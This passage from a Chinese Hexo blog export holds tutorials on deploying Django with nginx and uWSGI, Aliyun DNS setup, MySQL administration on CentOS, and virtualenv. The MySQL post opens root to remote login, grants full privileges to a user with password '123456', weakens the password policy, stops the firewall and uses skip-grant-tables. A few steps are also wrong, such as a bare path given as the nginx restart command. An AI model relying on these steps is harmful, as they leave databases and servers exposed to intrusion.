src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/7.png"></p><blockquote><p><strong>注意：设置配置文件时，在系统创建文件将代码复制到文件里，不可在系统外导入配置文件</strong> </p></blockquote><h3 id="Nginx常用命令"><a href="#Nginx常用命令" class="headerlink" title="Nginx常用命令"></a><strong>Nginx常用命令</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ &#x2F;etc&#x2F;init.d&#x2F;nginx start  #启动</span><br><span class="line">$ &#x2F;etc&#x2F;init.d&#x2F;nginx stop  #关闭</span><br><span class="line">$ &#x2F;etc&#x2F;init.d&#x2F;nginx restart  #重启</span><br><span class="line">$  killall nginx             # 杀死所有nginx</span><br><span class="line">$ps -ef|grep -i nginx     # 查看nginx启动进程</span><br><span class="line">$pkill -9 nginx                杀死nginx启动进程</span><br><span class="line"></span><br><span class="line"># 如果是生产环境的话Nginx正在运行，就不要直接stop start 或者 restart  直接reload就行了</span><br><span class="line"># 对线上影响最低</span><br><span class="line">$ &#x2F;etc&#x2F;init.d&#x2F;nginx reload</span><br></pre></td></tr></table></figure><p><strong>在网站安装目录里与Django项目同级我们创建了一个peizhi文件夹，就是专门用来放配置文件的</strong> </p><h3 id="创建StudyOnline-nginx-conf文件"><a href="#创建StudyOnline-nginx-conf文件" class="headerlink" title="创建StudyOnline_nginx.conf文件"></a>创建StudyOnline_nginx.conf文件</h3><p><strong>安装好nginx后在peizhi文件夹创建 网站名称_nginx.conf文件，来写nginxI的配置文件</strong> </p><p><strong>创建 StudyOnline_nginx.conf 文件</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># nginx配置文件</span><br><span class="line">upstream django &#123;</span><br><span class="line">    # 设置动态请求转发端口，要与uwsgi配置文件的socket监听端口一致</span><br><span class="line">    server 127.0.0.1:8000;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    # 设置监听端口</span><br><span class="line">    listen      80;</span><br><span class="line"></span><br><span class="line">    # 设置网站访问ip或者域名，域名要解析好</span><br><span class="line">    server_name www.poket.top;</span><br><span class="line"></span><br><span class="line">   # 设置编码</span><br><span class="line">    charset     utf-8;</span><br><span class="line"></span><br><span class="line">    # 设置网站最大上传限制</span><br><span class="line">    client_max_body_size 75M;</span><br><span class="line"></span><br><span class="line">    # 设置Django的media用户上传文件目录</span><br><span class="line">    location &#x2F;media  &#123;</span><br><span class="line">        alias &#x2F;var&#x2F;www&#x2F;Python_project&#x2F;StudyOnline&#x2F;media&#x2F;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   # 设置Django的static静态文件目录如js、css文件目录</span><br><span class="line">    location &#x2F;static &#123;</span><br><span class="line">        alias &#x2F;var&#x2F;www&#x2F;Python_project&#x2F;StudyOnline&#x2F;static&#x2F;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 设置动态请求转发给uwsgi</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        # 动态请求时，执行upstream django的配置转发</span><br><span class="line">        uwsgi_pass  django;</span><br><span class="line">        # 通过nginx启动目录 &#x2F;etc&#x2F;nginx&#x2F;uwsgi_params 的uwsgi_params模块文件，与uwsgi交互</span><br><span class="line">        include     uwsgi_params; # the uwsgi_params file you installed</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 指定日志存放路径，一般指定到网站配置文件目录</span><br><span class="line">    access_log  &#x2F;var&#x2F;www&#x2F;Python_project&#x2F;peizhi&#x2F;nginx.log;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>nginx的配置文件写好后，将配置文件软连接到<code> /etc/nginx/conf.d </code>目录，也就是nginxI的启动目录</strong> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ln &#x2F;var&#x2F;www&#x2F;Python_project&#x2F;peizhi&#x2F;StudyOnline_nginx.conf</span><br><span class="line"> &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p><strong>软连接创建好后，启动nginx</strong> ，发生了错误</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(env3.4) root@ktt:&#x2F;var&#x2F;www&#x2F;Python_project&#x2F;peizhi# &#x2F;usr&#x2F;sbin&#x2F;nginxnginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">nginx: [emerg] still could not bind()</span><br></pre></td></tr></table></figure><h3 id="80端口占用解决"><a href="#80端口占用解决" class="headerlink" title="80端口占用解决"></a>80端口占用解决</h3><li>查看80端口被哪个服务占用了</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant | grep 80</span><br><span class="line">或者使用</span><br><span class="line">lsof -i:80</span><br></pre></td></tr></table></figure><li>关闭占用80端口的程序</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fuser -k 80&#x2F;tcp</span><br></pre></td></tr></table></figure><li>重新启动nginx</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;nginx&#x2F;conf.d</span><br></pre></td></tr></table></figure><p>###<strong>补充内容防盗链配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Nginx防盗链配置</span><br><span class="line">有些时候，大家不想让别人调用自己的图片，一是因为个人版权的问题，再一点就是会增加服务器的负载、还会产生一些没必要的流量。</span><br><span class="line"></span><br><span class="line">其实在Nginx里面，很容易就做到防盗链的，在nginx.conf文件加入一个localtion配置项。</span><br><span class="line"></span><br><span class="line">下面请看配置：</span><br><span class="line"></span><br><span class="line">location ~ .*\.(jpg|jpeg|JPG|png|gif|icon)$ &#123;</span><br><span class="line">        valid_referers blocked www.poket.top poket.top;</span><br><span class="line">        if ($invalid_referer) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">gif|jpg|jpeg|….,这些是你想要屏蔽的文件类型，可以根据情况修改。</span><br><span class="line"></span><br><span class="line">只需要把文中 www.poket.top poket.top 修改为你允许显示你网站图片的其他网站域名，注意中间用空格分开，而不是逗号。</span><br><span class="line"></span><br><span class="line">这样直接返回的是404页面。也可以用http:&#x2F;&#x2F;domain.com&#x2F;404.jpg，显示给盗链者看到的图片，注意不要放到自己的域名上，因为放盗链的作用，那样对方是看不到的，可以上传到一些支持外联的网络相册上。</span><br><span class="line"></span><br><span class="line">当然了，也可以设置某个目录防盗链，只需把localtion匹配的改成一个目录就可以了，比如：</span><br><span class="line"></span><br><span class="line">location ~ ^&#x2F;images&#x2F; &#123;</span><br><span class="line">    valid_referers none blocked www.poket.top poket.top;</span><br><span class="line">    if ($invalid_referer) &#123;</span><br><span class="line">        return 404;</span><br><span class="line">    &#125;</span><br><span class="line">    #rewrite ^&#x2F; http:&#x2F;&#x2F;otherdomin.com&#x2F;404.jpg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>启动nginx后访问nginx配置文件里设置的访问域名或者ip</strong> </p><p><strong>当然此时网站可以启动了，但是后台和网站的一些样式和静态文件无法访问</strong></p><p><strong>所以，我们需要拉取所有静态文件到static目录</strong></p></blockquote><h3 id="django静态文件收集"><a href="#django静态文件收集" class="headerlink" title="django静态文件收集"></a><strong>django静态文件收集</strong></h3><li>**在django的`setting`文件中，添加下面一行内容：**</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL &#x3D; &#39;&#x2F;static&#x2F;&#39;    # 设置静态文件前缀名称</span><br><span class="line"># 配置静态文件目录</span><br><span class="line">#STATICFILES_DIRS &#x3D; [</span><br><span class="line">#    os.path.join(BASE_DIR, &#39;static&#39;),   # 设置静态文件路径</span><br><span class="line">#]</span><br><span class="line"># 配置静态文件访问路径</span><br><span class="line">STATIC_ROOT &#x3D; os.path.join(BASE_DIR, &#39;static&#39;)</span><br></pre></td></tr></table></figure><li>执行`collectstatic`命令 ,收集资源</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd 进入到网站项目根目录</span><br><span class="line">python manage.py collectstatic</span><br></pre></td></tr></table></figure><p> <strong>此时网站部署完成</strong></p><blockquote><p><strong>注意：设置配置文件时，在系统创建文件将代码复制到文件里，不可在系统外导入配置文件</strong></p><p><strong>此时部署完成，网站配置文件夹里会有如下文件</strong></p></blockquote><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/10.png"></p><h1 id="日后操作管理"><a href="#日后操作管理" class="headerlink" title="日后操作管理"></a><strong>日后操作管理</strong></h1><blockquote><p><strong>停止网站服务</strong></p></blockquote><p><strong>首先进入虚拟环境</strong></p><p><strong>1.pkill -9 uwsgi    　　 　　　　　　杀死uwsgi进程</strong></p><p><strong>2.ps -ef|grep -i uwsgi　　　　　　 查看进程情况</strong></p><p><strong>3.pkill -9 nginx　　　　　　　　     杀死nginx进程</strong></p><p><strong>4.ps -ef|grep -i nginx　　　　　　 查看进程情况</strong></p><blockquote><p><strong>启动网站服务</strong></p></blockquote><p><strong>首先进入虚拟环境</strong></p><p><strong>cd进入到uwsgi的配置文件目录</strong></p><p><strong>1.uwsgi -i jxiou_uwsgi.ini &amp;　　　 启动uwsgi</strong></p><p><strong>2.ps -ef|grep -i uwsgi　　　　　　 查看进程情况</strong></p><p><strong>3./usr/sbin/nginx　　　　　　　　 启动nginx</strong></p><p><strong>4.ps -ef|grep -i nginx　　　　　　 查看进程情况</strong></p><p><strong>最后别忘了关闭Django调试模式</strong></p><p><strong>就是在settings.py文件关闭调试模式，关闭后配置的404才能起作用，不至于大黄页</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># SECURITY WARNING: don&#39;t run with debug turned on in production!</span><br><span class="line">DEBUG &#x3D; False                                # 将调试模式关闭,关闭后访问页面出错不会显示错误(大黄页)</span><br><span class="line">ALLOWED_HOSTS &#x3D; [&#39;*&#39;]                        # 当关闭调试模式时，必须设置允许访问的ip，*代表所有以访问</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
          <category> Django </category>
          
          <category> ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> Django </tag>
            
            <tag> uwsgi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云ECS云服务器学习</title>
      <link href="/2018/05/18/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/05/18/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ECS云服务器概述"><a href="#ECS云服务器概述" class="headerlink" title="ECS云服务器概述"></a><center>ECS云服务器概述</center></h1><a id="more"></a><h2 id="什么是云服务器ECS"><a href="#什么是云服务器ECS" class="headerlink" title="什么是云服务器ECS"></a>什么是云服务器ECS</h2><p>云服务器（Elastic Computer Service,简称ECS）是一种简单高效、处理能力可弹性伸缩的计算服务，帮助您快速构建更稳定、安全的应用，提升运维效率，降低IT成本，使您跟专注于核心业务创新。</p><h2 id="ECS的产品定位和实现原理"><a href="#ECS的产品定位和实现原理" class="headerlink" title="ECS的产品定位和实现原理"></a>ECS的产品定位和实现原理</h2><li>ECS（云服务器）是阿里云产品体系中，最基础的计算服务，通常用作应用程序的 运行环境，其最重要的特点是弹性</li><h2 id="ECS是应用的基础运行环境"><a href="#ECS是应用的基础运行环境" class="headerlink" title="ECS是应用的基础运行环境"></a>ECS是应用的基础运行环境</h2><h2 id="ECS的弹性伸缩"><a href="#ECS的弹性伸缩" class="headerlink" title="ECS的弹性伸缩"></a>ECS的弹性伸缩</h2><h2 id="ECS的优势"><a href="#ECS的优势" class="headerlink" title="ECS的优势"></a>ECS的优势</h2>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> ECS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云域名绑定</title>
      <link href="/2018/05/18/%E9%98%BF%E9%87%8C%E4%BA%91%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/"/>
      <url>/2018/05/18/%E9%98%BF%E9%87%8C%E4%BA%91%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<p>这几天从阿里云买了几个域名，准备做点实验。</p><a id="more"></a><h1 id="如何设置和验证域名解析"><a href="#如何设置和验证域名解析" class="headerlink" title="如何设置和验证域名解析"></a><center>如何设置和验证域名解析</center></h1><h2 id="步骤一：添加域名"><a href="#步骤一：添加域名" class="headerlink" title="步骤一：添加域名"></a>步骤一：添加域名</h2><p>登录阿里云控制台，进入域名解析列表，阿里云域名会自动显示，非阿里云域名需要自己手动添加 </p><h2 id="步骤二：添加A记录和MX记录"><a href="#步骤二：添加A记录和MX记录" class="headerlink" title="步骤二：添加A记录和MX记录"></a>步骤二：添加A记录和MX记录</h2><p>单击<code>解析设置</code>，当然你也可以点击<code>新手引导</code>，快速修改<code>网站解析</code>（A记录）和<code>邮箱解析</code>（MX记录）</p><p><img src="/2018/05/18/%E9%98%BF%E9%87%8C%E4%BA%91%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/Image.png"></p><p> 在<code>记录值</code>中添加自己的服务器iP地址，然后系统会自动帮你添加A记录，邮箱解析也是一样的 </p><h2 id="步骤三：修改DNS服务器"><a href="#步骤三：修改DNS服务器" class="headerlink" title="步骤三：修改DNS服务器"></a>步骤三：修改DNS服务器</h2><p>您需要阿里云解析DNS 服务器，才能使您的ip域名生效，阿里云服务器选用的是阿里云DNS解析，非阿里云注册域名需要到域名那里修改域名的DNS </p><blockquote><p>首先你在阿里云云解析DNS中记录下DNS名称，复制下来 </p></blockquote><p><img src="/2018/05/18/%E9%98%BF%E9%87%8C%E4%BA%91%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/Image2.png"></p><blockquote><p>前往域名控制台，点击域名，修改DNS </p></blockquote><p><img src="/2018/05/18/%E9%98%BF%E9%87%8C%E4%BA%91%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/Image3.png"></p><blockquote><p>输入阿里云NDS服务名称 </p></blockquote><p><img src="/2018/05/18/%E9%98%BF%E9%87%8C%E4%BA%91%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/Image4.png"></p><h2 id="步骤四：等待生效和验证"><a href="#步骤四：等待生效和验证" class="headerlink" title="步骤四：等待生效和验证"></a>步骤四：等待生效和验证</h2><p>新增解析记录立即生效，其时间时之前添加记录时的<code>TTL</code>值，默认是10分钟左右生效。在windows下通过cmd打开命令行窗口，ping  域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping xxxx</span><br></pre></td></tr></table></figure><p>查看域名解析A记录是否生效 如果域名出现了指向的ip地址，说明解析生效. </p><p>使用命令 <code>nslookup -qt=mx 域名</code>查看域名的解析MX记录是否生效，返回内容一直，那么解析生效  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt&#x3D;mx 域名</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> 阿里云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos下mysql操作</title>
      <link href="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/"/>
      <url>/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql安装及链接"><a href="#Mysql安装及链接" class="headerlink" title=" Mysql安装及链接"></a><center> Mysql安装及链接</center></h1><p>Centos7默认安装的是mariadb数据库，所以先将这个数据库删除</p><a id="more"></a><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%871.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove mariadb-libs.x86_64</span><br></pre></td></tr></table></figure><h2 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h2><table><thead><tr><th align="center">下载mysql源</th><th align="center"><a href="https://dev.mysql.com/downloads/repo/yum">https://dev.mysql.com/downloads/repo/yum</a>,</th></tr></thead><tbody><tr><td align="center">安装源</td><td align="center">yum localinstall mysql57-community-release-el7-8.noarch.rpm</td></tr><tr><td align="center">安装mysql</td><td align="center">yum install mysql-community-server</td></tr><tr><td align="center">默认密码</td><td align="center">cat /etc/log/mysqld.log | grep “password”</td></tr></tbody></table><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%872.png"></p><h2 id="登录mysql与密码修改"><a href="#登录mysql与密码修改" class="headerlink" title="登录mysql与密码修改"></a>登录mysql与密码修改</h2><p>登录命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password:</span><br></pre></td></tr></table></figure><p>密码重置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD &#x3D; PASSWORD(‘123456’)；</span><br></pre></td></tr></table></figure><p>此时会报错，主要原因是我们的密码过于简单了，没法通过。</p><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%873.png"></p><blockquote><p>问题解决如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password_policy&#x3D;0; </span><br><span class="line">set global validate_password_mixed_case_count&#x3D;2;</span><br></pre></td></tr></table></figure><p>退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">quit</span><br><span class="line">或者</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h1 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a><center>远程登录</center></h1><h2 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 首先要已经登录了mysql</span><br><span class="line">show databases;</span><br><span class="line">use mysql;</span><br><span class="line">show tables;</span><br><span class="line">select * from user \G;  # \G会以人性化的方式展现数据</span><br><span class="line">select Host,User from user \G;</span><br><span class="line">update user set host &#x3D; &#39;%&#39; where Host &#x3D; &quot;localhost&quot; and User &#x3D; &quot;root&quot;;</span><br><span class="line">select Host,User from user \G;  # 再次使用这个命令会发现数据发生了变化</span><br></pre></td></tr></table></figure><p>我把我操作的结果展示一下</p><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%874.png"></p><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%875.png"></p><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%876.png"></p><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%877.png"></p><br><h2 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 刷新权限</span><br><span class="line">flush privileges;</span><br><span class="line">或者</span><br><span class="line">sudo service mysqld restart</span><br></pre></td></tr></table></figure><h2 id="步骤三"><a href="#步骤三" class="headerlink" title="步骤三"></a>步骤三</h2><p>如果这个时候还是无法连接，那么可能是防火墙没有关闭，因为防火墙开启的时候，会把我们的端口屏蔽了 ，于是关闭防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> sudo service firewalld stop</span><br></pre></td></tr></table></figure><h1 id="开启genelog"><a href="#开启genelog" class="headerlink" title="开启genelog"></a><center>开启genelog</center></h1><h2 id="设置文件位置并开启genelog"><a href="#设置文件位置并开启genelog" class="headerlink" title="设置文件位置并开启genelog"></a>设置文件位置并开启genelog</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 设置文件位置</span><br><span class="line">set global general log file&#x3D;&quot;tmp&#x2F;general.log&quot; </span><br><span class="line"># 开启general</span><br><span class="line">set global general_log&#x3D;on;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>如果出现无法打开文件这样的错误，一般 是权限原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su -root</span><br></pre></td></tr></table></figure><p>问题就解决了</p></blockquote><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%878.png"></p><h2 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;ktt&#39;@&#39;%&#39; identified by &#39;123456&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%879.png"></p><blockquote><p>新建的用户ktt数据非常少的，如果你想展现更多的数据，需要赋予权限</p></blockquote><h2 id="权限赋予"><a href="#权限赋予" class="headerlink" title="权限赋予"></a>权限赋予</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;ktt&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%8710.png"></p><p><img src="/2018/05/17/Centos%E4%B8%8Bmysql%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%8711.png"></p><h2 id="部分权限"><a href="#部分权限" class="headerlink" title="部分权限"></a>部分权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant insert, select on *.* to &#39;ktt&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</span><br></pre></td></tr></table></figure><h2 id="权限收回"><a href="#权限收回" class="headerlink" title="权限收回"></a>权限收回</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke all privileges on *.* FROM ktt;</span><br></pre></td></tr></table></figure><h2 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a>密码找回</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;my.conf  # 在这个文件里面添加安全验证跳过语句</span><br><span class="line">skip-grant-tables;</span><br><span class="line">use mysql;</span><br><span class="line">update user set authentication_string&#x3D;password(&#39;456789&#39;) where user&#x3D;&#39;root&#39;;</span><br></pre></td></tr></table></figure><p>重新启动mysql服务，再次登录时候返现不需要密码就可以登录了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysqld restart</span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> Centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下python虚拟环境配置</title>
      <link href="/2018/05/16/Linux%E4%B8%8Bpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/05/16/Linux%E4%B8%8Bpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="Virtualenv"><a href="#Virtualenv" class="headerlink" title="Virtualenv"></a><center>Virtualenv</center></h1><p>系统中的多个python混用会导致<code>$PYTHONPATH</code>混乱，或者各个工程对于package的版本要求不同等等情况。有一个简单的解决方案就是用virtualenv来隔离多个python，其本质只是实现隔离不同python中<code>$PYTHONPATH</code>的路径，当然也可以衍生到隔离多个<code>$PATH</code>。 </p><a id="more"></a><h2 id="安装和使用virtualenv"><a href="#安装和使用virtualenv" class="headerlink" title="安装和使用virtualenv"></a>安装和使用virtualenv</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">virtualenv  虚拟环境名称</span><br><span class="line">source  虚拟环境的路径/bin/activate</span><br></pre></td></tr></table></figure><p><img src="/2018/05/16/Linux%E4%B8%8Bpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Image.png"></p><h1 id="virtualenvwrapper"><a href="#virtualenvwrapper" class="headerlink" title="virtualenvwrapper"></a><center>virtualenvwrapper</center></h1><blockquote><p><strong>注意：安装的顺序不能颠倒，virtualenvwrapper必须依赖于virtualenv</strong> 